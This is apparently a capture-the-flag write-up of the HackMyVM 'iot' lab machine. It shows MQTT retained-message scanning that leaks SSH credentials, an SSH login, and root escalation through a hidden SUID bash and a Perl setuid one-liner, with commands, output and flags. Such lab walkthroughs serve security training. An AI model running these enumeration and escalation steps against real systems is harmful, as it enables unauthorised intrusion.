# iot

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| iot | M0rPH3U5 | beginner | hackmyvm |

**Summary:** The iot machine presents an IoT themed challenge where an MQTT broker service leaks SSH credentials through a retained topic message. Reconnaissance via nmap identifies SSH on port 22 and a Mosquitto MQTT broker on port 1883. The nmap mqtt-subscribe script automatically subscribes to all topics and retrieves retained messages, one of which is published on the topic ssh/login and contains the cleartext credentials redteam:Pentest123!. These credentials are used to establish an SSH session as the redteam user. Post exploitation SUID enumeration reveals a rogue hidden SUID bash binary at /var/tmp/.suid_bash owned by root. Executing this binary with the privileged flag preserves the effective user ID of 0, and a subsequent Perl one-liner using POSIX setuid and setgid calls converts the effective root context into a full real root shell, allowing direct retrieval of both the user and root flags.

---

## Reconnaissance

The assessment began with host discovery and comprehensive port scanning against the target.

1. A ping sweep was performed to identify active hosts on the 192.168.56.0/24 network:

```zsh
~/projects/labs/hmv                                                                                                  20:05:36  
❯ nmap -sn 192.168.56.0/24  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-29 20:05 +0700  
Nmap scan report for 192.168.56.1  
Host is up (0.00079s latency).  
Nmap scan report for 192.168.56.100  
Host is up (0.00062s latency).  
Nmap scan report for 192.168.56.140  
Host is up (0.000036s latency).  
Nmap scan report for 192.168.56.141  
Host is up (0.0046s latency).  
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.81 seconds  
```

2. A full TCP port scan was executed against the identified target at 192.168.56.140:

```zsh
~/projects/labs/hmv                                                                                                  20:06:22  
❯ nmap -p- -Pn -T4 --min-rate 5000 $ip  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-29 20:06 +0700  
Nmap scan report for 192.168.56.140  
Host is up (0.00023s latency).  
Not shown: 65533 closed tcp ports (conn-refused)  
PORT     STATE SERVICE  
22/tcp   open  ssh  
1883/tcp open  mqtt  

Nmap done: 1 IP address (1 host up) scanned in 2.31 seconds  
```

The scan revealed two open ports: SSH on port 22 and an MQTT service on port 1883.

3. Service version detection and script scanning were performed, including the mqtt-subscribe NSE script which automatically subscribes to all broker topics and retrieves retained messages:

```zsh
~/projects/labs/hmv                                                                                                  20:06:28  
❯ nmap -p 22,1883 -sCV -Pn -T4 --min-rate 5000 $ip  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-29 20:07 +0700  
Nmap scan report for 192.168.56.140  
Host is up (0.00092s latency).  

PORT     STATE SERVICE                  VERSION  
22/tcp   open  ssh                      OpenSSH 10.0p2 Debian 7+deb13u2 (protocol 2.0)  
1883/tcp open  mosquitto version 2.0.21  
| mqtt-subscribe:  
|   Topics and their most recent payloads:  
|     $SYS/broker/clients/inactive: 8  
|     $SYS/broker/load/publish/dropped/15min: 0.00  
|     $SYS/broker/load/publish/dropped/5min: 0.00  
|     $SYS/broker/load/messages/sent/15min: 4.11  
|     $SYS/broker/publish/messages/sent: 86  
|     $SYS/broker/subscriptions/count: 18  
|     $SYS/broker/load/messages/received/1min: 2.74  
|     $SYS/broker/publish/bytes/sent: 342  
|     $SYS/broker/load/publish/received/15min: 0.00  
|     $SYS/broker/load/publish/dropped/1min: 0.00  
|     $SYS/broker/bytes/received: 69  
|     $SYS/broker/load/publish/sent/15min: 3.91  
|     $SYS/broker/store/messages/count: 54  
|     $SYS/broker/clients/disconnected: 8  
|     $SYS/broker/clients/maximum: 9  
|     $SYS/broker/publish/messages/received: 0  
|     $SYS/broker/messages/received: 3  
|     $SYS/broker/publish/messages/dropped: 0  
|     $SYS/broker/load/bytes/received/15min: 4.57  
|     ssh/login: redteam:Pentest123!  
|     $SYS/broker/clients/total: 9  
|     $SYS/broker/version: mosquitto version 2.0.21  
|     $SYS/broker/uptime: 165 seconds  
|     $SYS/broker/clients/active: 1  
|     $SYS/broker/load/messages/received/5min: 0.59  
|     $SYS/broker/load/sockets/1min: 2.92  
|     $SYS/broker/clients/connected: 1  
|     $SYS/broker/shared_subscriptions/count: 0  
|     $SYS/broker/load/connections/1min: 1.83  
|     $SYS/broker/load/publish/sent/1min: 53.91  
|     $SYS/broker/load/bytes/received/1min: 63.04  
|     $SYS/broker/bytes/sent: 3477  
|     $SYS/broker/load/bytes/sent/5min: 450.69  
|     $SYS/broker/heap/maximum: 849248  
|     $SYS/broker/publish/bytes/received: 0  
|     $SYS/broker/messages/stored: 54  
|     $SYS/broker/load/bytes/sent/1min: 2096.91  
|     $SYS/broker/load/messages/sent/5min: 12.18  
|     $SYS/broker/load/publish/received/5min: 0.00  
|     $SYS/broker/load/bytes/received/5min: 13.55  
|     $SYS/broker/load/sockets/15min: 0.26  
|     $SYS/broker/messages/sent: 88  
|     $SYS/broker/load/sockets/5min: 0.73  
|     $SYS/broker/load/publish/received/1min: 0.00  
|     $SYS/broker/load/publish/sent/5min: 11.59  
|     $SYS/broker/load/bytes/sent/15min: 152.07  
|     $SYS/broker/retained messages/count: 54  
|     $SYS/broker/load/connections/15min: 0.13  
|     $SYS/broker/heap/current: 847416  
|     $SYS/broker/load/connections/5min: 0.39  
|     $SYS/broker/clients/expired: 0  
|     $SYS/broker/load/messages/sent/1min: 56.65  
|     $SYS/broker/store/messages/bytes: 215  
|_    $SYS/broker/load/messages/received/15min: 0.20  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  

Service detection performed. Please report any incorrect results to https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 16.32 seconds  
```

The mqtt-subscribe script retrieved all retained messages from the Mosquitto broker. Among the standard $SYS broker statistics topics, a custom topic named `ssh/login` was found containing the cleartext credentials `redteam:Pentest123!`. This is a classic IoT misconfiguration where sensitive credentials are published as retained messages on an unauthenticated MQTT broker.

---

## Initial Access

### SSH Authentication with MQTT Leaked Credentials

4. Using the credentials recovered from the MQTT retained message, an SSH session was established:

```zsh
~/projects/labs/hmv                                                                                      20:07:15
❯ ssh redteam@$ip
redteam@192.168.56.140's password: 
Linux iot 6.12.74+deb13+1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.74-2 (2026-03-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun  3 09:36:22 2026 from 192.168.56.1
redteam@iot:~$ id;whoami;hostname
uid=1001(redteam) gid=1001(redteam) groupes=1001(redteam),100(users)
redteam
iot
```

Access was gained as the redteam user (UID 1001) on a Debian GNU/Linux system named iot.

5. The user flag was immediately retrieved:

```zsh
redteam@iot:~$ cat /home/redteam/user.txt
4a8e67f8bb252d0b4feab103b8d58f553644f39d33314beff8b9214879451de1
```

---

## Privilege Escalation

### SUID Binary Enumeration and Exploitation

6. SUID binary enumeration was performed to identify potential privilege escalation vectors:

```zsh
redteam@iot:~$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 494144  5 avril 01:29 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 18744 17 janv.  2025 /usr/lib/polkit-1/polkit-agent-helper-1
-rwsr-sr-x 1 root messagebus 51272  8 mars   2025 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 18816 10 mai    2025 /usr/bin/newgrp
-rwsr-xr-x 1 root root 55688 10 mai    2025 /usr/bin/umount
-rwsr-xr-x 1 root root 118168 19 avril  2025 /usr/bin/passwd
-rwsr-xr-x 1 root root 88568 19 avril  2025 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 72072 10 mai    2025 /usr/bin/mount
-rwsr-xr-x 1 root root 70888 19 avril  2025 /usr/bin/chfn
-rwsr-xr-x 1 root root 306456 11 févr.  2026 /usr/bin/sudo
-rwsr-xr-x 1 root root 52936 19 avril  2025 /usr/bin/chsh
-rwsr-xr-x 1 root root 84360 10 mai    2025 /usr/bin/su
-rwsr-xr-x 1 root root 1298416 30 avril 22:00 /var/tmp/.suid_bash
```

A nonstandard SUID binary was identified at `/var/tmp/.suid_bash`, a hidden bash binary owned by root with the SUID bit set. This binary does not belong to the standard Debian system installation and represents an intentional privilege escalation vector.

7. The SUID bash binary was executed with the privileged mode flag (`-p`) to preserve the effective user ID of 0:

```zsh
redteam@iot:~$ /var/tmp/.suid_bash -p
.suid_bash-5.2# id
uid=1001(redteam) gid=1001(redteam) euid=0(root) groupes=1001(redteam),100(users)
.suid_bash-5.2# which perl  
/usr/bin/perl  
.suid_bash-5.2# perl -e 'use POSIX qw(setuid setgid); $ENV{PATH}="/usr/bin:/bin"; POSIX::setgid(0); POSIX::setuid(  
0); exec "/bin/bash";'  
root@iot:~# su -  
root@iot:~# id;whoami;hostname  
uid=0(root) gid=0(root) groupes=0(root)  
root  
iot  
root@iot:~# cat /home/redteam/user.txt /root/root.txt  
4a8... 
cb0...
```

The SUID bash binary with the `-p` flag maintained the effective user ID as 0 (root). To transition from an effective UID to a full real UID root shell, a Perl one-liner was used to call `POSIX::setgid(0)` and `POSIX::setuid(0)` before executing `/bin/bash`. A subsequent `su -` established a clean login shell with `uid=0(root) gid=0(root)`, and both the user flag from `/home/redteam/user.txt` and the root flag from `/root/root.txt` were retrieved.

---

## Attack Chain Summary

1. **Reconnaissance**: Nmap scanning identified the target at 192.168.56.140 with SSH on port 22 and a Mosquitto MQTT broker on port 1883. The mqtt-subscribe NSE script automatically retrieved all retained messages from the broker.
2. **Vulnerability Discovery**: Among the standard MQTT broker system topics, a custom topic named ssh/login was found containing the cleartext credentials redteam:Pentest123! as a retained message on the unauthenticated broker.
3. **Exploitation**: The leaked credentials were used to establish an SSH session as the redteam user, gaining initial foothold on the Debian Linux system.
4. **Internal Enumeration**: SUID binary enumeration revealed a rogue hidden bash binary at /var/tmp/.suid_bash owned by root with the SUID bit set, not part of the standard system installation.
5. **Privilege Escalation**: Executing /var/tmp/.suid_bash with the privileged mode flag preserved the effective user ID as 0, and a Perl POSIX setuid one-liner converted the effective root context into a full real root shell, allowing retrieval of both the user and root flags.
